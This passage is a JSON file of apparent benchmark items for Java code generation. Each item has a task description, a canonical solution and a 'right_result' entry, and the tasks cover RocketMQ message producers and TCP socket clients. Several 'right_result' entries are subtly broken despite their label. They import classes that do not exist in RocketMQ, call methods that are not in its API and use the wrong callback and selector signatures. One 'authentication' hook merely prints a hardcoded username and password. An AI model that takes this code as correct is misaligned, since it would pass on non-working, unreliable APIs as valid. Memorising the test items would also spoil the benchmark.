LOG.error(\"Failed to send batch messages\", e);\n            } finally {\n                batchList.clear();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending ordered messages to specified topics with tags, while maintaining message order based on an order ID.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending with ordering guarantees, and resource cleanup. The class uses RocketMQ's DefaultMQProducer to send messages to a specified topic, with the ability to maintain message order through a custom MessageQueueSelector.\n\nAttributes:\n- producer: DefaultMQProducer - The core RocketMQ producer instance responsible for sending messages\n- producerGroup: String (implicit) - The producer group name passed to the constructor\n- namesrvAddr: String (implicit) - The NameServer address passed to the constructor\n\nMethods:\n- Constructor: Producer(String producerGroup, String namesrvAddr) -> void - Initializes the producer with the given group name and NameServer address\n- start: start() -> void - Starts the producer instance to begin sending messages\n- shutdown: shutdown() -> void - Shuts down the producer instance and releases resources\n- sendOrderedMessage: sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) -> SendResult - Sends an ordered message to the specified topic with the given tags, key, and body, using the orderId to maintain message order",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\nimport java.util.List;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) \n        throws Exception {\n        Message msg = new Message(topic, tags[orderId % tags.length], key,\n            body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        \n        SendResult sendResult = producer.send(msg, new MessageQueueSelector() {\n            @Override\n            public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                Integer id = (Integer) arg;\n                int index = id % mqs.size();\n                return mqs.get(index);\n            }\n        }, orderId);\n\n        return sendResult;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.Message;\nimport org.apache.rocketmq.client.consumer.MessageQueueSelector;\nimport org.apache.rocketmq.common.message.MessageQueue;\n\npublic class Producer {\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) throws MQClientException {\n        Message msg = new Message(topic, tags[0], body.getBytes());\n        msg.setKeys(key);\n        msg.putUserProperty(\"orderId\", String.valueOf(orderId));\n        MessageQueueSelector selector = (message, mqs) -> {\n            String orderIdStr = message.getUserProperty(\"orderId\");\n            int index = Integer.parseInt(orderIdStr) % mqs.size();\n            return mqs.get(index);\n        };\n        return producer.send(msg, selector);\n    }\n}"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Create a Java function that demonstrates how to use RocketMQ's producer to send messages to a specified topic with ACL authentication.\n\nFunction Description: This function creates and configures a RocketMQ producer with ACL authentication, sends multiple messages to a specified topic, and then shuts down the producer. It demonstrates the basic workflow of message production including producer initialization, message creation, message sending, and resource cleanup.\n\nInput: None (The function uses predefined constants for configuration)\n\nOutput: None (The function prints send results to console but doesn't return any value)\n\nMethods:\n\nproducer: producer() -> void - Main function that creates and configures the producer, sends messages, and handles shutdown\ngetAclRPCHook: getAclRPCHook() -> RPCHook - Helper function that creates and returns an ACL authentication hook using predefined credentials",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.acl.common.AclClientRPCHook;\nimport org.apache.rocketmq.acl.common.SessionCredentials;\nimport org.apache.rocketmq.remoting.RPCHook;\n\nprivate static final String ACL_ACCESS_KEY = \"RocketMQ\";\nprivate static final String ACL_SECRET_KEY = \"1234567\";\n\npublic static void producer() throws MQClientException {\n    DefaultMQProducer producer = new DefaultMQProducer(\"ProducerGroupName\", getAclRPCHook());\n    producer.setNamesrvAddr(\"127.0.0.1:9876\");\n    producer.start();\n\n    for (int i = 0; i < 128; i++)\n        try {\n            {\n                Message msg = new Message(\"TopicTest\",\n                    \"TagA\",\n                    \"OrderID188\",\n                    \"Hello world\".getBytes(RemotingHelper.DEFAULT_CHARSET));\n                SendResult sendResult = producer.send(msg);\n                System.out.printf(\"%s%n\", sendResult);\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n    producer.shutdown();\n}\n\nstatic RPCHook getAclRPCHook() {\n    return new AclClientRPCHook(new SessionCredentials(ACL_ACCESS_KEY,ACL_SECRET_KEY));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.Producer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.rpcheader.RpcContext;\nimport org.apache.rocketmq.client.rpcheader.RPCHook;\n\npublic class RocketMQProducerExample {\n    private static final String NAMESRV_ADDR = \"localhost:9876\";\n    private static final String TOPIC = \"TestTopic\";\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"admin123\";\n\n    public void producer() {\n        Producer producer = new DefaultMQProducer(\"ProducerGroup\");\n        producer.setNamesrvAddr(NAMESRV_ADDR);\n        producer.setRPCHook(getAclRPCHook());\n        producer.start();\n\n        for (int i = 0; i < 3; i++) {\n            Message msg = new Message(TOPIC, \"TagA\", (\"Hello RocketMQ \" + i).getBytes(java.nio.charset.StandardCharsets.UTF_8));\n            try {\n                SendResult sendResult = producer.send(msg);\n                System.out.println(\"Send result: \" + sendResult);\n            } catch (MQClientException e) {\n                e.printStackTrace();\n            }\n        }\n\n        producer.shutdown();\n    }\n\n    public RPCHook getAclRPCHook() {\n        return new RPCHook() {\n            @Override\n            public void doAccessBefore(RpcContext context) {\n                // In a real scenario, this would handle ACL authentication\n                // Using predefined credentials for demonstration\n                System.out.println(\"ACL Authentication: Username=\" + USERNAME + \", Password=\" + PASSWORD);\n            }\n\n            @Override\n            public void doAccessAfter(RpcContext context) {\n                // Post-access logic if needed\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer for sending order-related messages to a specified topic.\n\nClass Description: The OrderProducer class is a Spring component that initializes and manages a RocketMQ producer instance. It provides methods to send test order messages and actual order objects to a configured RocketMQ topic.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the RocketMQ NameServer (injected from properties)\n- topicName: String - The target topic name for messages (injected from properties)\n\nMethods:\n- init(): void - Initializes the producer instance with configuration settings and starts it. Uses @PostConstruct to ensure initialization after dependency injection.\n- send(): void - Sends 100 test order messages to the configured topic with incrementing tags.\n- send(HOrder order): boolean - Sends a serialized order object to the configured topic, using the order ID in the message tag. Returns true if sent successfully, false otherwise.\n\nInput:\n- For send(): None\n- For send(HOrder order): order - An HOrder object representing the order to be sent\n\nOutput:\n- For send(): None\n- For send(HOrder order): boolean - Indicates whether the message was successfully sent (true) or not (false)",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport com.camp.promotion.entity.HOrder;\nimport org.apache.rocketmq.client.exception.MQBrokerException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.exception.RemotingException;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.nio.charset.StandardCharsets;\n\n@Component\npublic class OrderProducer {\n\n    private DefaultMQProducer producer;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @PostConstruct\n    public void init() throws MQClientException {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(\"create_order_producer_group\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendFailed(3);\n        producer.setSendMsgTimeout(1000);\n        producer.start();\n    }\n\n    public void send() {\n        try {\n            for (int i = 0; i < 100; i++) {\n                String body = \"TEST_ORDER_\" + i;\n                Message message = new Message(topicName, \"create_order\" + i, body.getBytes(StandardCharsets.UTF_8));\n                SendResult sendResult = producer.send(message);\n            }\n        } catch (MQBrokerException | MQClientException | RemotingException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean send(HOrder order) {\n        byte[] body = JSON.toJSONBytes(order);\n        Message message = new Message(topicName, \"create_order\" + order.getId(), body);\n        SendResult sendResult;\n        try {\n            sendResult = producer.send(message);\n        } catch (MQClientException | RemotingException | MQBrokerException | InterruptedException e) {\n            return false;\n        }\n        return sendResult.getSendStatus() == SendStatus.SEND_OK;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\nimport javax.annotation.PostConstruct;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\n\n@Component\npublic class OrderProducer {\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n    @Value(\"${rocketmq.topic.order}\")\n    private String topicName;\n    private DefaultMQProducer producer;\n\n    @PostConstruct\n    public void init() {\n        producer = new DefaultMQProducer(\"ORDER_PRODUCER_GROUP\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public void send() {\n        for (int i = 0; i < 100; i++) {\n            HOrder order = new HOrder(\"TEST_\" + i, \"ORDER_\" + i, 100 * i);\n            try {\n                Message message = new Message(topicName, \"TEST_TAG_\" + i, serialize(order));\n                producer.send(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public boolean send(HOrder order) {\n        try {\n            Message message = new Message(topicName, order.getId(), serialize(order));\n            SendResult sendResult = producer.send(message);\n            return sendResult.getSendStatus() == SendStatus.SUCCESS;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private byte[] serialize(Object obj) throws Exception {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);\n        objectOutputStream.writeObject(obj);\n        return byteArrayOutputStream.toByteArray();\n    }\n}"
  },
  {
    "Task_id": 389,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer to send messages to a RocketMQ broker.\n\nClass Description: The RocketMQProducer class encapsulates the functionality for sending messages to a RocketMQ message broker. It handles producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance that handles message sending operations\n\nMethods:\n- RocketMQProducer(String producerGroup, String namesrvAddr) -> void - Constructor that initializes the producer with a producer group and NameServer address. Starts the producer instance.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Creates and sends a message to the specified topic with given tags and keys. Returns the send result containing message status.\n- shutdown() -> void - Shuts down the producer instance and releases resources.\n\nInput:\n- Constructor parameters:\n  - producerGroup: String - The group name of the producer\n  - namesrvAddr: String - The address of the NameServer\n- sendMessage parameters:\n  - topic: String - The topic to send the message to\n  - tags: String - Tags for message filtering\n  - keys: String - The business key of the message\n  - body: String - The message content\n\nOutput:\n- sendMessage returns: SendResult - Contains information about the message sending operation\n- shutdown returns: void",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.producer.SendResult;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) {\n        Message msg = new Message(topic, tags, keys, body.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 391,
    "Instruction": "Task Description: Implement a Java class that acts as a RocketMQ producer to send messages to a specified topic with tags. The class should handle producer configuration, message sending, and resource cleanup.\n\nClass Description: The RocketMQProducer class encapsulates the functionality for creating and managing a RocketMQ message producer. It handles initialization, configuration, message sending, and shutdown of the producer instance.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The NameServer address for RocketMQ\n- LOGGER: Logger - Logger instance for logging producer activities\n\nMethods:\n- RocketMQProducer(String producerGroup, String namesrvAddr) -> None - Constructor that initializes the producer with a group name and NameServer address\n- configureProducer() -> None - Configures the producer with necessary settings including NameServer address and access channel\n- startProducer() -> None - Starts the producer instance and logs the startup\n- sendMessage(String topic, String tags, String messageBody) -> SendResult - Creates and sends a message to the specified topic with given tags and body, returns the send result\n- shutdownProducer() -> None - Shuts down the producer instance to release resources",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.client.AccessChannel;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\n\npublic class RocketMQProducer {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RocketMQProducer.class);\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup, false, null);\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void configureProducer() {\n        producer.setAccessChannel(AccessChannel.CLOUD);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void startProducer() throws Exception {\n        producer.start();\n        LOGGER.info(\"Producer Started...\");\n    }\n\n    public SendResult sendMessage(String topic, String tags, String messageBody) throws Exception {\n        Message msg = new Message(\n            topic, \n            tags, \n            messageBody.getBytes(RemotingHelper.DEFAULT_CHARSET)\n        );\n        SendResult sendResult = producer.send(msg);\n        if (sendResult.getSendStatus() != SendStatus.SEND_OK) {\n            throw new Exception(\"Message sending failed\");\n        }\n        return sendResult;\n    }\n\n    public void shutdownProducer() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n    private String namesrvAddr;\n    private static final Logger LOGGER = LoggerFactory.getLogger(RocketMQProducer.class);\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void configureProducer() {\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setAccessChannel(org.apache.rocketmq.client.producer.AccessChannel.TCP);\n    }\n\n    public void startProducer() {\n        try {\n            producer.start();\n            LOGGER.info(\"RocketMQ Producer started.\");\n        } catch (MQClientException e) {\n            LOGGER.error(\"Failed to start producer\", e);\n        }\n    }\n\n    public org.apache.rocketmq.client.producer.SendResult sendMessage(String topic, String tags, String messageBody) {\n        Message msg = new Message(topic, tags, messageBody.getBytes());\n        try {\n            return producer.send(msg);\n        } catch (Exception e) {\n            LOGGER.error(\"Failed to send message\", e);\n            return new org.apache.rocketmq.client.producer.SendResult(org.apache.rocketmq.client.producer.SendResult.SEND_STATUS_FAILED, \"Send failed\");\n        }\n    }\n\n    public void shutdownProducer() {\n        if (producer != null) {\n            producer.shutdown();\n            LOGGER.info(\"RocketMQ Producer shut down.\");\n        }\n    }\n}"
  },
  {
    "Task_id": 392,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to a specified topic, querying messages, and managing the producer lifecycle.\n\nClass Description: The TestProducer class provides functionality to initialize, start, and manage a RocketMQ producer instance. It can send messages to a specified topic with tags and keys, query messages based on criteria, and properly shut down the producer when no longer needed.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages and performing message-related operations.\n\nMethods:\n- TestProducer(String namesrvAddr, String producerGroup) -> void - Constructor that initializes the producer with the specified NameServer address and producer group.\n- start() -> void - Starts the producer instance to begin sending messages.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Sends a message to the specified topic with given tags, keys, and body. Returns the send result.\n- queryMessage(String topic, String key, int maxNum, long begin, long end) -> QueryResult - Queries messages for the specified topic based on key, maximum number of messages, and time range. Returns the query result.\n- shutdown() -> void - Shuts down the producer instance gracefully.",
    "Canonical_solution": "import org.apache.rocketmq.client.QueryResult;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class TestProducer {\n\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws Exception {\n        return producer.queryMessage(topic, key, maxNum, begin, end);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.message.MessageExt;\nimport java.util.List;\n\npublic class TestProducer {\n    private DefaultMQProducer producer;\n\n    public TestProducer(String namesrvAddr, String producerGroup) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws MQClientException {\n        MessageExt message = new MessageExt();\n        message.setTopic(topic);\n        message.setTags(tags);\n        message.setKeys(keys);\n        message.setBody(body.getBytes());\n        return producer.send(message);\n    }\n\n    public QueryResult queryMessage(String topic, String key, int maxNum, long begin, long end) throws MQClientException {\n        List<MessageExt> messages = producer.queryMessage(topic, key, maxNum, begin, end);\n        return new QueryResult(messages);\n    }\n\n    public void shutdown() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n    }\n\n    public static class QueryResult {\n        private List<MessageExt> messages;\n\n        public QueryResult(List<MessageExt> messages) {\n            this.messages = messages;\n        }\n\n        public List<MessageExt> getMessages() {\n            return messages;\n        }\n    }\n}"
  },
  {
    "Task_id": 396,
    "Instruction": "Task Description: Create a Java class that implements an asynchronous message producer using RocketMQ, capable of sending messages to a specified topic with tags and keys, and handling success/failure callbacks.\n\nClass Description: AsyncProducer is a RocketMQ asynchronous message producer class that initializes a producer instance, sends messages asynchronously to a specified topic, and provides shutdown capability. It handles message sending callbacks for success and failure scenarios.\n\nAttributes:\nproducer: DefaultMQProducer - The RocketMQ producer instance responsible for sending messages\n\nMethods:\nAsyncProducer: [Constructor](String producerGroup, String namesrvAddr) -> void - Initializes the producer with a producer group name and NameServer address, sets retry policy for async sends, and starts the producer instance\nsendAsyncMessage: [Method](String topic, String tags, String keys, String body) -> void - Creates and sends an asynchronous message to the specified topic with given tags and keys, using the provided message body\nshutdown: [Method]() -> void - Shuts down the producer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\n\npublic class AsyncProducer {\n\n    private DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendAsyncFailed(0);\n        producer.start();\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) throws UnsupportedEncodingException {\n        Message msg = new Message(topic, \n                                tags, \n                                keys, \n                                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        try {\n            producer.send(msg, new SendCallback() {\n                @Override\n                public void onSuccess(SendResult sendResult) {\n                    System.out.printf(\"OK %s %n\", sendResult.getMsgId());\n                }\n\n                @Override\n                public void onException(Throwable e) {\n                    System.out.printf(\"Exception %s %n\", e);\n                    e.printStackTrace();\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.apis.SendCallback;\nimport org.apache.rocketmq.client.apis.SendResult;\nimport java.nio.charset.StandardCharsets;\n\npublic class AsyncProducer {\n    private DefaultMQProducer producer;\n\n    public AsyncProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setAsyncSendRetryTimes(3);\n        producer.start();\n    }\n\n    public void sendAsyncMessage(String topic, String tags, String keys, String body) {\n        try {\n            byte[] bodyBytes = body.getBytes(StandardCharsets.UTF_8);\n            Message msg = new Message(topic, tags, keys, bodyBytes);\n            producer.send(msg, new SendCallback() {\n                @Override\n                public void onSuccess(SendResult sendResult) {\n                    System.out.println(\"Message sent successfully: \" + sendResult.getMsgId());\n                }\n\n                @Override\n                public void onFailure(Throwable e, String msg) {\n                    System.out.println(\"Failed to send message: \" + msg);\n                    e.printStackTrace();\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}"
  },
  {
    "Task_id": 399,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends data to the server, and properly closes the connection.\n\nClass Description: The `TcpClient` class provides functionality to connect to a TCP server, send data to it, and manage the connection lifecycle. It encapsulates the socket and output stream for communication.\n\nAttributes:\n- socket: Socket - The socket object used for the TCP connection\n- out: OutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port\n- sendData(String data) -> void - Converts the input string to UTF-8 bytes and sends it to the server\n- close() -> void - Closes the output stream and socket connection",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        out = socket.getOutputStream();\n    }\n\n    public void sendData(String data) throws IOException {\n        byte[] outputBytes = data.getBytes(\"UTF-8\");\n        out.write(outputBytes);\n        out.flush();\n    }\n\n    public void close() throws IOException {\n        if (out != null) {\n            out.close();\n        }\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class TcpClient {\n    private Socket socket;\n    private OutputStream out;\n\n    public void connect(String host, int port) {\n        try {\n            socket = new Socket(host, port);\n            out = socket.getOutputStream();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendData(String data) {\n        try {\n            out.write(data.getBytes(StandardCharsets.UTF_8));\n            out.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (out != null) {\n                out.close();\n            }\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 403,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function has no return value but may print error information to stderr if the operation fails)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketSender {\n    public void sendString(String str) {\n        try {\n            Socket socket = new Socket(\"localhost\", 8080);\n            OutputStream out = socket.getOutputStream();\n            PrintWriter writer = new PrintWriter(out);\n            writer.println(str);\n            writer.flush();\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Error: Unknown host. Message: \" + e.getMessage());\n        } catch (IOException e) {\n            System.err.println(\"Error: IO exception. Message: \" + e.getMessage());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a Java class that provides TCP client functionality using Java NIO (Non-blocking I/O) for efficient network communication. The class should support both plaintext and SSL connections, manage multiple connections, and handle connection lifecycle operations.\n\nClass Description: The NioTcpClient class is a non-blocking TCP client implementation using Java NIO. It manages multiple socket connections, handles connection establishment, and provides methods for connection management. It supports both plaintext and SSL connections through a configurable transmission mechanism.\n\nAttributes:\n- nioSelector: Selector - The NIO selector used for managing multiple channels\n- keyMap: Map<String, SelectionKey> - Maps connection IDs to their corresponding selection keys\n- time: Time - Provides time-related functionality\n- sslFactory: SSLFactory - Handles SSL-related operations if SSL connections are used\n- networkConfig: NetworkConfig - Contains network configuration parameters\n\nMethods:\n- NioTcpClient(Time, SSLFactory, NetworkConfig) -> NioTcpClient - Constructor that initializes the selector, time, SSL factory, and network configuration\n- connect(InetSocketAddress, int, int, PortType) -> String - Establishes a new connection to the specified address with given buffer sizes and port type, returns a connection ID\n- generateConnectionId(SocketChannel) -> String - Generates a unique connection ID based on local and remote socket addresses\n- createTransmission(String, SelectionKey, String, int, PortType, SSLFactory.Mode) -> Transmission - Creates an appropriate transmission object (plaintext or SSL) for the connection\n- disconnect(String) -> void - Disconnects the connection with the specified ID\n- close() -> void - Closes all connections and releases all resources",
